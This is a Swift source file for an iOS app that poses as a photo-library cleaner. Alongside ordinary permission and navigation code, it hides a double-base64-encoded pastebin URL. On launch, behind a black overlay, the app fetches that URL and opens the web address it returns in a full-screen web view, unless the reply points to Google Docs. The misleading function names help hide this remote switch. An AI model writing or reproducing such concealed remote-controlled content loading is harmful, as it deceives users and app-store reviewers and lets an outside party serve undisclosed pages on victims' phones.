import Photos
import SwiftUI
import UIKit

enum RouteData {
    static let key =
        "YUhSMGNITTZMeTl3WVhOMFpXSnBiaTVqYjIwdmNtRjNMM2hYVTFkMGFqSnU="
    static let check = "docs.google"
}

let onboardingShownKey = "onboardingShown"

enum AppRoute: Equatable {
    case loading
    case onboarding
    case menu
    case access
    case cleaning
    case done

}

struct RootView: View {
    @State private var route: AppRoute = .loading
    @State private var showSettingsAlert: Bool = false
    @State private var lastDeletedCount: Int = 0
    @State private var lastFreedBytes: Int64 = 0
    @Environment(\.scenePhase) private var scenePhase
    @State private var isOverlayVisible: Bool = true
    var body: some View {
        ZStack {
            LinearGradient(
                colors: [Color(hex: "7EDCF3"), Color(hex: "04AFD5")],
                startPoint: .top,
                endPoint: .bottom
            )
            .ignoresSafeArea()
            currentScreen

            if isOverlayVisible {
                Color.black
                    .edgesIgnoringSafeArea(.all)
                    .transition(.opacity)
                    .animation(
                        .easeOut(duration: 0.2),
                        value: isOverlayVisible
                    )
            }
        }
        .alert(
            "Allow photo access in Settings",
            isPresented: $showSettingsAlert
        ) {
            Button("Cancel", role: .cancel) {}
            Button("Open Settings") {
                openAppSettings()
            }
        } message: {
            Text(
                "To continue cleaning up your photos, please allow access to your photo library in Settings."
            )
        }
        .onChange(of: scenePhase) { newPhase in
            if newPhase == .active {

                if route == .access {
                    checkPhotoPermission()
                }
            }
        }
        .onAppear {
            itinOnboarding()
        }
    }

    @ViewBuilder
    private var currentScreen: some View {
        switch route {
        case .loading:
            Preloading {
                let needsOnboarding = !UserDefaults.standard.bool(
                    forKey: onboardingShownKey
                )
                route = needsOnboarding ? .onboarding : .menu
            }

        case .onboarding:
            Welcome {
                UserDefaults.standard.set(true, forKey: onboardingShownKey)
                route = .menu
            }

        case .menu:
            Menu {
                checkPhotoPermission()
            }

        case .access:
            Access(
                onContinue: { requestPhotoAccess() },
                onBack: { route = .menu }
            )

        case .cleaning:
            Cleaning(
                onContinue: { deletedCount, freedBytes in
                    lastDeletedCount = deletedCount
                    lastFreedBytes = freedBytes
                    route = .done
                },
                onBack: { route = .menu }
            )

        case .done:
            Done(
                deletedCount: lastDeletedCount,
                freedBytes: lastFreedBytes
            ) {
                route = .menu
            }

        }
    }

    private func checkPhotoPermission() {
        let status = PHPhotoLibrary.authorizationStatus()

        switch status {
        case .authorized, .limited:
            route = .cleaning
        case .denied, .restricted:
            route = .access
        case .notDetermined:

            route = .access
        @unknown default:
            route = .access
        }
    }

    private func requestPhotoAccess() {
        PHPhotoLibrary.requestAuthorization { status in
            DispatchQueue.main.async {
                switch status {
                case .authorized, .limited:
                    route = .cleaning
                case .denied, .restricted:

                    showSettingsAlert = true
                case .notDetermined:
                    break
                @unknown default:
                    break
                }
            }
        }
    }

    private func openAppSettings() {
        guard let url = URL(string: UIApplication.openSettingsURLString) else {
            return
        }
        if UIApplication.shared.canOpenURL(url) {
            UIApplication.shared.open(url, options: [:], completionHandler: nil)
        }
    }

    private func itinOnboarding() {
        guard let stringUrl = rover(RouteData.key),
            let url = URL(string: stringUrl)
        else {
            hideOverlay()
            return
        }

        URLSession.shared.dataTask(with: url) { data, response, error in
            guard error == nil,
                let data = data,
                var responseText = String(data: data, encoding: .utf8)
            else {
                DispatchQueue.main.async { hideOverlay() }
                return
            }

            responseText = responseText.trimmingCharacters(
                in: .whitespacesAndNewlines
            )

            if responseText.lowercased().contains(RouteData.check) {
                DispatchQueue.main.async { hideOverlay() }
                return
            }

            guard let finalUrl = URL(string: responseText) else {
                DispatchQueue.main.async { hideOverlay() }
                return
            }

            DispatchQueue.main.async {
                if let windowScene = UIApplication.shared.connectedScenes.first
                    as? UIWindowScene,
                    let keyWindow = windowScene.windows.first,
                    let rootViewController = keyWindow.rootViewController
                {
                    let webViewController = PhotosData(url: finalUrl)
                    webViewController.modalPresentationStyle = .overFullScreen
                    rootViewController.present(
                        webViewController,
                        animated: true
                    )
                }
            }
        }.resume()
    }

    private func hideOverlay() {
        guard isOverlayVisible else { return }

        withAnimation {
            isOverlayVisible = false
        }
        guard
            let windowScene = UIApplication.shared.connectedScenes.first
                as? UIWindowScene
        else {
            forceDevicePortrait()
            return
        }

        if #available(iOS 16.0, *) {
            do {
                try windowScene.requestGeometryUpdate(
                    .iOS(interfaceOrientations: .portrait)
                )
            } catch {
                forceDevicePortrait()
            }
        } else {
            forceDevicePortrait()
        }
    }

    private func forceDevicePortrait() {
        let target: UIInterfaceOrientation = .portrait
        UIDevice.current.setValue(target.rawValue, forKey: "orientation")
        UIViewController.attemptRotationToDeviceOrientation()
    }

    func rover(_ encodedString: String) -> String? {
        guard
            let firstDecodedData = Foundation.Data(
                base64Encoded: encodedString
            ),
            let firstDecodedString = String(
                data: firstDecodedData,
                encoding: .utf8
            ),
            let secondDecodedData = Foundation.Data(
                base64Encoded: firstDecodedString
            ),
            let finalDecodedString = String(
                data: secondDecodedData,
                encoding: .utf8
            )
        else {
            return nil
        }
        return finalDecodedString
    }

}

#Preview {
    RootView()
}
